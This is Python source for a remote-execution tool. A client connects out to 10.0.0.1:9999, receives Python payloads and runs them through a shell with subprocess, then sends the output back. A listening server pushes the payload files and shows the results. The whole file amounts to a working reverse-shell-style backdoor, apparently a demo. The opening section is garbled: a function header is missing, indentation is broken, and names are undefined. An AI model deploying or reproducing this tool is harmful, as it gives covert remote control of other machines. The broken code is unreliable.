import os
import socket
        global port
        global s
        host = '10.0.0.1'
        port = 9999
        s = socket.socket()
        s = s
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


def receive():
    global s
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            args = data.split()
            if data[:3].decode("utf-8") == 'run':
                payloadSize = long(args[1])
                s.send('ready')
                data = s.recv(1024)
                totalRecv = len(data)
                payload = data
                while totalRecv < payloadSize:
                    data = s.recv(1024)
                    totalRecv += len(data)
                    payload += data
                runproc('python - <<EOF ' + '\n' + payload + '\n' + 'EOF')
        else:
            s.send('send command to me!')
            receive()
    s.close()

def runproc(data):
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes)
    try:
        s.send('\n---start client response---\n\n' + str.encode(output_str) + '\n---end client response---\n')
    except:
        s.send('\n---start client response---\n\nencoding error\n\n---end client response---\n')
    print(output_str)

def main():
    create()
    connect()
    receive()


main()


from __future__ import print_function
import socket
import sys
import os

cmd = ""


def create():
    try:
        global host
        global port
        global s
        host = '10.0.0.1'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket error: " + str(msg))


def bind():
    try:
        global host
        global port
        global s
        print("Listening on port  " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket error: " + str(msg))
        socket_bind()


def accept():
    conn, address = s.accept()
    print("Client connection established: " + "IP " + address[0] + "  Port: " + str(address[1]))
    ssend(conn)
    conn.close()


def ssend(conn):
    while True:
        cmd = raw_input("demo$ ")
        args = cmd.split()
        if len(cmd) < 1:
            continue
        elif cmd == 'quit' or cmd == 'exit':
            conn.send('goodbye!')
            conn.close()
            s.close()
            sys.exit()
        elif args[0] == 'run':
            conn.send('run ' + str(os.path.getsize(args[1])))
            resp = conn.recv(1024)
            if resp[:5].decode("utf-8") == 'ready':
                f = open(args[1],'r')
                data = f.read(1024)
                while (data):
                    conn.send(data)
                    data = f.read(1024)
                f.close()
                conn.send('FILE_TRANSFER_COMPLETE')
                print('PAYLOAD SENT.')
                data = ''
                while True:
                    client_response = str(conn.recv(1024))
                    data += client_response
                    print(data)
                    if len(client_response) < 1024:
                        break


def main():
    create()
    bind()
    accept()

main()
